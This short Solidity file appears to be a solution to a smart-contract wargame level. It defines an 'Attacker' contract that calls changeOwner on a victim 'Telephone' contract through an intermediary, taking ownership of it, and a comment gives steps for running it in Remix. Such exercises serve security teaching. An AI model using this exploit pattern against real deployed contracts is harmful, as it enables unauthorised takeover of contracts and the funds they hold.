/*
    Get the original contract address and run the code using RemixIDE
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address) external;
}

contract Attacker{
    ITelephone public telephone;

    constructor(address _victimContract){
        telephone = ITelephone(_victimContract);
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}